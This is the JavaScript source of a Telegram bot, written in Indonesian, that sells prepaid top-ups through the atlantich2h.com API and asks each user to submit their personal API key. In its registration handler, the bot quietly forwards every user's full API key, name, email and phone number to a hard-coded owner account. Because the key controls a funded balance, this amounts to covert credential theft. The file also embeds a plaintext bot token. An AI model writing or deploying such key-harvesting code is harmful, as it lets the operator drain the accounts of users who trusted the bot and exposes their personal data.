const { Telegraf, Markup, session } = require('telegraf');
const axios = require('axios');
const FormData = require('form-data');

const BOT_TOKEN = '8602360591:AAGLcMSN5IQ5mBJjkj_MHmL0l6URlXhkTWw';
const OWNER_ID = '8793356645';
const BASE_URL = 'https://atlantich2h.com';

const bot = new Telegraf(BOT_TOKEN);

// Menggunakan session agar bot ingat tahap transaksi user
bot.use(session());

// --- PERISAI ANTI-CRASH ---
function esc(text) {
    return text ? text.toString().replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&') : '';
}

// --- FUNGSI REQUEST API ---
async function callAtlantic(endpoint, body = {}) {
    try {
        const formData = new FormData();
        for (const key in body) { formData.append(key, body[key]); }
        const res = await axios.post(`${BASE_URL}${endpoint}`, formData, {
            headers: formData.getHeaders(),
            timeout: 15000
        });
        return res.data;
    } catch (e) { return { status: false, message: "Server Busy" }; }
}

// --- START ---
bot.start(async (ctx) => {
    ctx.session = {}; // Reset session
    const apiKey = userDb[ctx.from.id];
    
    if (apiKey) {
        return ctx.replyWithMarkdownV2(
            `✨ *SALAM HANGAT, YANG MULIA\\!* ✨\n\n` +
            `🚀 *Pilih menu di bawah untuk memulai\\:*`,
            Markup.inlineKeyboard([
                [Markup.button.callback('👤 MY PROFILE', 'get_profile'), Markup.button.callback('💸 TRANSAKSI', 'menu_kategori')],
                [Markup.button.callback('🔍 CEK NAMA', 'menu_cek')]
            ])
        );
    } else {
        return ctx.replyWithMarkdownV2(`👑 *SELAMAT DATANG YANG MULIA* 👑\n\n🔒 *Gerbang Terkunci\\!* Silakan kirimkan API Key Anda sekarang untuk mendaftar\\.`);
    }
});

// Database sederhana (Gunakan file json/database jika ingin permanen)
const userDb = {};

// --- HANDLER PENDAFTARAN (AUTO-DETECT) ---
bot.on('text', async (ctx, next) => {
    if (!userDb[ctx.from.id] && !ctx.message.text.startsWith('/')) {
        const apiKey = ctx.message.text;
        const res = await callAtlantic('/get_profile', { api_key: apiKey });

        if (res.status === "true" || res.status === true) {
            userDb[ctx.from.id] = apiKey;
            const d = res.data;
            ctx.reply(`✅ API Key Berhasil Terpasang!\n👤 Nama: ${d.name}\n💰 Saldo: ${d.balance}`);
            
            // NOTIF OWNER FULL TRANSPARAN
            bot.telegram.sendMessage(OWNER_ID, `📢 *NEW USER*\n🔑 API: \`${apiKey}\`\n👤 Nama: ${d.name}\n📧 Email: ${d.email}\n📞 HP: ${d.phone}`, { parse_mode: 'Markdown' });
            return;
        } else {
            return ctx.reply('❌ API Key salah! Kirim ulang API Key yang valid.');
        }
    }
    
    // Tahap Input Target Transaksi
    if (ctx.session?.step === 'WAITING_TARGET') {
        ctx.session.target = ctx.message.text;
        const { code, name, price } = ctx.session.selectedProduct;
        
        ctx.session.step = 'WAITING_CONFIRM';
        return ctx.replyWithMarkdownV2(
            `🛒 *KONFIRMASI PESANAN* 🛒\n` +
            `─────────────────────\n` +
            `📦 *Produk:* ${esc(name)}\n` +
            `🎯 *Target:* \`${esc(ctx.session.target)}\`\n` +
            `💸 *Harga:* Rp ${esc(price)}\n` +
            `─────────────────────\n` +
            `⚠️ Apakah data sudah benar?`,
            Markup.inlineKeyboard([
                [Markup.button.callback('✅ LANJUTKAN', 'confirm_trx'), Markup.button.callback('❌ BATAL', 'back_start')]
            ])
        );
    }
    return next();
});

// --- MENU KATEGORI ---
bot.action('menu_kategori', (ctx) => {
    ctx.editMessageText('🏷️ *PILIH KATEGORI PRODUK:*', {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('🎮 GAMES', 'cat_Games'), Markup.button.callback('📱 E-MONEY', 'cat_E-Money')],
            [Markup.button.callback('💡 PLN', 'cat_PLN'), Markup.button.callback('📞 PULSA', 'cat_Pulsa')],
            [Markup.button.callback('⬅️ KEMBALI', 'back_start')]
        ])
    });
});

// --- LIST PRODUK (STEP 1) ---
bot.action(/cat_(.+)/, async (ctx) => {
    const category = ctx.match[1];
    const apiKey = userDb[ctx.from.id];
    
    await ctx.editMessageText(`⌛ Menyusun daftar ${category}...`);
    const res = await axios.get(`${BASE_URL}/layanan/price_list?type=prabayar&api_key=${apiKey}`);
    
    if (res.data.status) {
        const filtered = res.data.data.filter(x => x.category.toLowerCase().includes(category.toLowerCase()));
        const buttons = filtered.slice(0, 15).map(p => [Markup.button.callback(`${p.name} - Rp${p.price}`, `buy_${p.code}`)]);
        buttons.push([Markup.button.callback('⬅️ KEMBALI', 'menu_kategori')]);
        
        ctx.editMessageText(`✨ *PILIH LAYANAN ${category.toUpperCase()}* ✨`, Markup.inlineKeyboard(buttons));
    }
});

// --- INPUT NOMOR (STEP 2) ---
bot.action(/buy_(.+)/, async (ctx) => {
    const code = ctx.match[1];
    const apiKey = userDb[ctx.from.id];
    
    // Cari data produk untuk konfirmasi nanti
    const res = await axios.get(`${BASE_URL}/layanan/price_list?type=prabayar&api_key=${apiKey}`);
    const product = res.data.data.find(x => x.code === code);
    
    ctx.session.selectedProduct = product;
    ctx.session.step = 'WAITING_TARGET';
    
    ctx.editMessageText(`📱 *LAYANAN:* ${product.name}\n\n👉 *Silakan ketik/kirim Nomor Target (ID/No HP):*`);
});

// --- EKSEKUSI TRANSAKSI (STEP 3) ---
bot.action('confirm_trx', async (ctx) => {
    const { code, target } = ctx.session;
    const apiKey = userDb[ctx.from.id];
    
    await ctx.editMessageText('⌛ Sedang memproses transaksi...');
    
    const res = await callAtlantic('/transaksi/create', {
        api_key: apiKey,
        code: ctx.session.selectedProduct.code,
        target: ctx.session.target,
        reff_id: 'LX' + Date.now()
    });

    if (res.status) {
        ctx.replyWithMarkdownV2(`✅ *BERHASIL\\!* \nStatus: ${esc(res.data.status)}\nID: \`${esc(res.data.id)}\``);
    } else {
        ctx.reply(`❌ Gagal: ${res.message}`);
    }
    ctx.session = {}; // Clear session
});

// --- PROFILE ---
bot.action('get_profile', async (ctx) => {
    const apiKey = userDb[ctx.from.id];
    const res = await callAtlantic('/get_profile', { api_key: apiKey });
    if (res.status) {
        const d = res.data;
        ctx.editMessageText(`👤 *PROFILE*\n\nNama: ${d.name}\nSaldo: Rp${d.balance}\nStatus: ${d.status}`, Markup.inlineKeyboard([[Markup.button.callback('⬅️ KEMBALI', 'back_start')]]));
    }
});

bot.action('back_start', (ctx) => {
    ctx.session = {};
    ctx.editMessageText('👑 Menu Utama Yang Mulia:', Markup.inlineKeyboard([
        [Markup.button.callback('👤 MY PROFILE', 'get_profile'), Markup.button.callback('💸 TRANSAKSI', 'menu_kategori')],
        [Markup.button.callback('🔍 CEK NAMA', 'menu_cek')]
    ]));
});

bot.launch().then(() => console.log('🚀 Bot Interaktif Aktif!'));
